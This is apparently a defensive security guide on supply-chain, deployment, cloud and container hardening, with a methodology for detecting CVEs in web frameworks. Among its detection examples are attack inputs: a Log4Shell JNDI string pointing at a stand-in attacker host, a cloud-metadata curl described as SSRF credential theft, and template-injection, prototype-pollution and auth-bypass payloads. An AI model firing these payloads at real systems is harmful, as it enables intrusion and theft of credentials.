# Web Deployment and Supply-Chain Security

> **Source**: distilled from WooYun-database field experience + cloud-security best practices + the OWASP supply-chain-security guide
> **Methodology**: WooYun vulnerability-essence formula + L1-L4 systematic analysis
> **Related**: AI-application container-escape testing → [ai-baseline-security.md](ai-baseline-security.md)

---

## 1. Supply-Chain and Component Security

### 1.1 Nature of the Vulnerability

```
Supply-chain risk = trust in third-party code × transitive-dependency depth × update lag
```

70-90% of an application's code comes from open-source components, and one high-risk component vulnerability can affect tens of thousands of projects (e.g. Log4Shell, Polyfill.io).

### 1.2 Front-End Supply Chain

**npm/yarn Dependency Risks**

| Attack type | description | typical case |
|----------|------|----------|
| Malicious package | a similarly named malicious package (typosquatting) | `crossenv` steals environment variables |
| Prototype pollution | `lodash`/`jQuery` prototype-chain pollution | CVE-2019-10744 |
| Dependency hijacking | a backdoor is planted after the maintainer's account is taken over | `event-stream` cryptomining |
| CDN poisoning | JS hosted on a public CDN is tampered | Polyfill.io supply-chain attack |
| Build injection | package.json script hooks run malicious commands | `postinstall` script attack |

**Detection Method**

```bash
# Audit known vulnerabilities
npm audit
yarn audit

# Check for outdated dependencies
npm outdated

# View the dependency-tree depth
npm ls --all | head -100

# Check for suspicious install scripts
npm pack --dry-run  # view the files that will be installed
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 Back-End Supply Chain

**Python/pip**

```bash
# Known-vulnerability audit
pip-audit
safety check

# View dependencies
pip list --outdated
pipdeptree  # visualize the dependency tree
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# View the dependency tree
mvn dependency:tree
```

**High-Risk Component-Vulnerability Quick Reference**

| Component | CVE | impact | detection |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoType deserialization |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-Type injection |
| Jackson | CVE-2019-12384 | RCE | polymorphic deserialization |
| Commons-Collections | CVE-2015-6420 | RCE | Java deserialization chain |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTML injection |
| Lodash | CVE-2021-23337 | RCE | template injection |

### 1.4 Docker-Image Supply Chain

```bash
# Image vulnerability scan
trivy image <image:tag>
grype <image:tag>

# Check the base image
docker inspect <image> | grep -i "rootfs\|created\|author"

# View image-layer history (discover hidden files/secrets)
docker history --no-trunc <image>
```

**Risk Points**:
- Using the `latest` tag instead of a fixed version
- The base image is too large (includes unnecessary tools like gcc/curl)
- Hardcoded secrets/credentials in the Dockerfile
- The container runs as root

### 1.5 Recommended SCA Tools

| Tool | language/scenario | characteristics |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | built-in, free |
| `pip-audit` / `safety` | Python | free |
| OWASP Dependency-Check | Java/.NET | open source, multi-language support |
| Snyk | all languages | SaaS, the most complete vulnerability database |
| Trivy | containers/IaC/SBOM | open source, fast |
| Grype | container images | open source, by Anchore |
| Renovate / Dependabot | automatic upgrades | GitHub integration |

### 1.6 SBOM (Software Bill of Materials)

```bash
# Generate an SBOM (CycloneDX format)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# Generate an SBOM (SPDX format)
syft <image> -o spdx-json > sbom.spdx.json   # container image
```

SBOM uses: compliance audits, license compliance, vulnerability tracking, supply-chain transparency.

### 1.7 Defenses

- **Pin versions**: use `package-lock.json` / `Pipfile.lock` / `pom.xml` to fix versions
- **Minimal dependencies**: periodically remove unused dependencies to avoid transitive-dependency bloat
- **CI integration**: add SCA scanning to CI/CD; vulnerabilities block the build
- **Private registry**: use a Nexus/Verdaccio proxy to avoid pulling directly from public registries
- **Signature verification**: npm supports `npm audit signatures` to verify package signatures
- **Regular updates**: set up Dependabot/Renovate to auto-create upgrade PRs

---

## 2. Cloud Deployment and Server Security

### 2.1 Nature of the Risk

```
Deployment risk = trust in default configurations × exposure surface × operational oversight
```

Application-code security does not equal system security. Deployment-environment misconfigurations are often the first breach point an attacker exploits.

### 2.2 Server-Hardening Checks

**Ports and Services**

```bash
# Scan open ports
nmap -sV -p- <target>

# High-risk port quick reference
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080 (Tomcat) 8443 (admin) 2375 (Docker API) 10250 (Kubelet)
```

| Check item | secure configuration | risk |
|--------|----------|------|
| SSH | disable root login, key authentication, non-22 port | brute force |
| Database port | bind only to 127.0.0.1 / an internal IP | unauthorized access |
| Redis | set a password, disable internet exposure, rename dangerous commands | RCE (write webshell/crontab/ssh) |
| MongoDB | enable authentication, bind to the internal network | data leak |
| Docker API | bind to a Unix socket, enable TLS | container escape / RCE |
| Elasticsearch | X-Pack authentication, disable internet exposure | data leak |
| Kubernetes API | RBAC, network policies, audit logs | cluster takeover |

**Operating-System Hardening**

```bash
# Linux hardening checks
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # illegitimate root users
find / -perm -4000 2>/dev/null        # SUID files
crontab -l                            # cron-job backdoor
last -20                              # recent login records
ss -tlnp                              # listening ports
iptables -L -n                        # firewall rules
```

### 2.3 TLS/SSL/HTTPS Configuration

**Testing Method**

```bash
# SSL/TLS configuration checks
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# Online check
# https://www.ssllabs.com/ssltest/
```

**Common Issues**

| Issue | Risk | Fix |
|------|------|------|
| TLS 1.0/1.1 not disabled | BEAST/POODLE attacks | enable only TLS 1.2+ |
| Weak cipher suites (RC4/DES/MD5) | downgrade attacks | use AES-GCM/ChaCha20 |
| Expired/self-signed certificate | man-in-the-middle | use Let's Encrypt / a CA certificate |
| Missing HSTS header | SSL strip | `Strict-Transport-Security: max-age=31536000` |
| Mixed content (HTTP+HTTPS) | content hijacking | site-wide HTTPS + CSP |

**Nginx Secure-Configuration Reference**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # Hide the version
    server_tokens off;
    
    # Disable directory listing
    autoindex off;
}
```

### 2.4 Cloud-Service Security

**General Cloud Risks (AWS/Azure/GCP/Alibaba Cloud)**

| Risk | detection method | impact |
|------|----------|------|
| Public S3/OSS bucket | `aws s3 ls s3://bucket --no-sign-request` | data leak |
| Over-broad IAM permissions | check for `*` wildcard policies | privilege escalation |
| Fully open security group | check for a `0.0.0.0/0` inbound rule | exposes internal services |
| Hardcoded secrets | scan the repo with `trufflehog`/`gitleaks` | account takeover |
| Metadata service | `curl http://169.254.169.254/` (SSRF abuse) | credential theft |
| Logging not enabled | CloudTrail/ActionTrail auditing | cannot trace back |

**PaaS-Platform Risks (Railway/Vercel/Heroku/Netlify)**

| Risk | description | detection |
|------|------|------|
| Environment-variable leak | build logs / error pages expose ENV | view public build logs |
| Domain takeover | a CNAME points to a deleted PaaS app | `dig CNAME <domain>` to check for dangling records |
| Shared-runtime escape | insufficient isolation between multi-tenant containers | probe same-node services |
| Deployment-credential leak | an API token is plaintext in the CI config | review CI/CD config files |
| Function injection | event injection into serverless functions | test how controllable the event parameters are |

**Cloud-Key Leak Detection**

```bash
# Code-repository scanning
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# Common leak locations
.env / .env.production / .env.local
docker-compose.yml
CI config: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
Front-end code: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 Container and Orchestration Security

> **AI-application container escape**: a container-escape testing methodology for AI Agent/LLM deployment environments → [ai-baseline-security.md](ai-baseline-security.md) §20

**Docker Security Checks**

```bash
# The container runs as non-root
docker inspect <container> | grep '"User"'

# Check for privileged mode
docker inspect <container> | grep '"Privileged"'

# Check mounts (sensitive directories)
docker inspect <container> | grep -A10 '"Mounts"'

# Check capabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**Kubernetes Security Checks**

```bash
# RBAC audit
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Pod security
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Plaintext-secret check
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# Network policy
kubectl get networkpolicy -A
```

### 2.6 CI/CD Pipeline Security

| Risk | description | defense |
|------|------|------|
| Plaintext secret storage | secrets hardcoded in the pipeline config | use Vault / Sealed Secrets |
| Untrusted dependencies | CI pulls unverified build tools | pin the CI image version |
| Build injection | modify the CI config in a PR to run malicious code | fork PRs must be approved before triggering CI |
| Artifact tampering | build artifacts are unsigned | sign with Cosign/Notary |
| Over-broad permissions | the CI token has admin privileges | use a least-privilege token |

### 2.7 Deployment-Security Checklist

**Servers**
- [ ] SSH key login; disable passwords and root
- [ ] Firewall opens only necessary ports (80/443)
- [ ] Databases/caches listen only on the internal network
- [ ] Regularly apply OS and middleware patches
- [ ] Enable audit logging and intrusion detection

**HTTPS**
- [ ] TLS 1.2+ with weak cipher suites disabled
- [ ] HSTS header + CAA record
- [ ] Automatic certificate renewal (Let's Encrypt)

**Cloud Services**
- [ ] IAM least privilege + MFA
- [ ] Bucket private + encrypted
- [ ] Security groups restrict source IPs
- [ ] CloudTrail / audit logging enabled
- [ ] Keys managed via KMS/Vault, not hardcoded

**Containers**
- [ ] Run as a non-root user
- [ ] Read-only filesystem
- [ ] No privileged mode + minimal capabilities
- [ ] Image scanning (Trivy/Grype)
- [ ] Network policies isolate inter-Pod communication

**CI/CD**
- [ ] Secrets managed via a secret store, not in config files
- [ ] SCA scanning integrated into the build pipeline
- [ ] Artifact-signature verification
- [ ] Fork PRs only trigger a build after approval

---

## 3. General Web-Framework CVE Detection Methodology

> Applicable to known-CVE detection and exploitation verification for any web framework, such as Next.js, Spring Boot, Django, Rails, Express, or Laravel

### 3.1 Framework Fingerprinting

**Automated Fingerprint Collection**

| Fingerprint source | detection method | information extracted |
|----------|----------|----------|
| HTTP response headers | check `X-Powered-By`, `Server`, `X-Framework` | framework name and version |
| Cookie name | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | framework type |
| Default error page | trigger a 404/500, analyze page features, style, and wording | framework + debug mode |
| Static-asset path | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | framework + build tool |
| JS file content | search for `webpack`/`vite`/`turbopack` markers and framework version strings | exact version number |
| Source Map | access `*.js.map` to check for leakage, analyze import paths | full list of framework + dependencies |
| Meta tags/comments | `<meta name="generator">` in the HTML, build comments | framework version |
| package.json leak | access `/package.json`, `/composer.json`, `/Gemfile.lock` | all dependencies and exact versions |

```
Fingerprinting process:
1. Passive collection → analyze response headers, cookies, HTML, JS
2. Active probing → default paths, error triggering, config-file access
3. Version pinning → down to major.minor.patch
4. CVE matching → query NVD/Snyk/GitHub Advisory
```

### 3.2 CVE Lookup and PoC Verification

**CVE Data Sources**

| Data source | URL | characteristics |
|--------|-----|------|
| NVD | nvd.nist.gov | official CVE database, CVSS scores |
| GitHub Advisory | github.com/advisories | open-source project vulnerabilities, with PoC links |
| Snyk | snyk.io/vuln | dependency-level exact matching |
| Exploit-DB | exploit-db.com | verified PoCs and exploits |
| PacketStorm | packetstormsecurity.com | security advisories and exploit code |
| Framework changelog | the framework's official release notes | security-fix details |

**General CVE-Verification Process**

```
1. Version comparison
   Confirm the version number → check the CVE's affected versions → confirm whether it falls in range

2. PoC reproduction
   a. Search for public PoCs (GitHub/Exploit-DB/security blogs)
   b. Understand the vulnerability principle (the patch diff is the best source)
   c. Build a request to verify in a test environment
   d. Note: in production, only verify the trigger condition; do not run a destructive payload

3. Patch analysis (reverse-engineer L4 defenses)
   a. Compare the before/after code diff → understand what was fixed
   b. Reverse-engineer: where the pre-fix handling logic was flawed
   c. Consider: is the fix complete? Is there a way to bypass it?
```

### 3.3 Common Framework Attack-Surface Categories

| Attack-surface type | general detection method | typical vulnerability pattern |
|-----------|-------------|-------------|
| **Route/middleware bypass** | path-normalization tests: `//path`, `/./path`, `/%2e/path`, case variants, forged special headers | authentication bypass, authorization skip |
| **Template/render injection** | inject template syntax in a parameter: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **Deserialization** | identify the serialization format (`ac ed 00 05`/`O:`/`rO0AB`), send malicious serialized data | Java/PHP/Python deserialization RCE |
| **Server Actions/RPC** | intercept framework-specific RPC calls, analyze the endpoint identifier, call it directly to bypass front-end validation | CSRF, input-validation bypass |
| **SSR/RSC injection** | intercept and modify server-render parameters (e.g. `_rsc`/`__data`/`loader`) to build an anomalous payload | server-side code execution |
| **Config-file disclosure** | traverse common config paths: `.env`, `web.config`, `application.yml`, `settings.py` | key/credential leak |
| **Debug endpoints** | check the framework debug mode: `/debug`, `/_debug`, `/__inspect`, `/graphql`(introspection) | information disclosure→RCE |
| **Prototype pollution (JS)** | inject `{"__proto__":{"isAdmin":true}}` or `{"constructor":{"prototype":{"x":1}}}` in the JSON body | privilege escalation, DoS |
| **Cache poisoning** | manipulate cache-key-related headers (`X-Forwarded-Host`/`X-Original-URL`), verify whether the response is cached | stored XSS, phishing |

### 3.4 General Framework-Security Checklist

```
[ ] Confirm the exact version of the framework and all dependencies
[ ] Query NVD/Snyk/GitHub Advisory for the corresponding CVE
[ ] Verify that all high-risk CVEs (CVSS≥7.0) are patched
[ ] Are source maps disabled
[ ] Is debug mode turned off
[ ] Do error pages leak the stack/path/version
[ ] Are default config-file paths accessible
[ ] Can middleware/route authorization be bypassed with path variants
[ ] Do all API endpoints require authentication (test by removing the cookie/token)
[ ] Are security response headers complete (CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] Does CSRF protection cover all state-changing operations
[ ] Do framework-specific RPC/Action endpoints have independent authorization
```

---

*Distilled from the WooYun vulnerability database (88,636 entries) + cloud/supply-chain security best practices | For security research and defense reference only*
